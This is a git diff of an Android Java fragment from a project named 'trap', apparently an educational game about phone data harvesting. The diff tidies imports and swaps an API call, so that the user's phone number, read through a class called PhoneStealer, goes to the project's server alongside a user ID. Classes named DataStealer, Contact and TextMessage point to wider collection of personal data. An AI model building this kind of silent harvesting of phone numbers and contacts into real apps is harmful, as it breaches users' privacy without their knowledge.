@@ -2,7 +2,6 @@ package de.hpi3d.gamepgrog.trap.ui;
 
 import android.Manifest;
 import android.annotation.SuppressLint;
-import android.content.Context;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.Bundle;
@@ -11,18 +10,15 @@ import android.view.LayoutInflater;
 import android.view.View;
 import android.view.ViewGroup;
 import android.widget.Button;
-import android.widget.Switch;
-import android.widget.Toast;
+
+import androidx.fragment.app.Fragment;
 
 import java.util.ArrayList;
 
-import androidx.fragment.app.Fragment;
 import de.hpi3d.gamepgrog.trap.R;
 import de.hpi3d.gamepgrog.trap.android.DataStealer;
-import de.hpi3d.gamepgrog.trap.android.PermissionHelper;
 import de.hpi3d.gamepgrog.trap.android.PhoneStealer;
-import de.hpi3d.gamepgrog.trap.api.ApiIntent;
-import de.hpi3d.gamepgrog.trap.api.ApiService;
+import de.hpi3d.gamepgrog.trap.api.ApiManager;
 import de.hpi3d.gamepgrog.trap.api.StorageManager;
 import de.hpi3d.gamepgrog.trap.datatypes.Contact;
 import de.hpi3d.gamepgrog.trap.datatypes.TextMessage;
@@ -145,13 +141,9 @@ public class MainFragment extends Fragment {
         resolver.executeAndShowResult(getActivity(), contactsTask).then(() -> {
             String number = PhoneStealer.getUserPhoneNumber(getContext());
             StorageManager.with(getActivity()).phoneNumber.set(number);
-            ApiIntent
-                    .build(getContext())
-                    .setCall(ApiService.CALL_PHONENUMBER)
-                    .put(ApiService.KEY_USER_ID, userid)
-                    .put(ApiService.KEY_PHONENUMBER, number)
-                    .start();
 
+            // Send Phone Number
+            ApiManager.api(getActivity()).sendPhoneNumber(userid, number).call();
             p.resolve(true);
         });
 
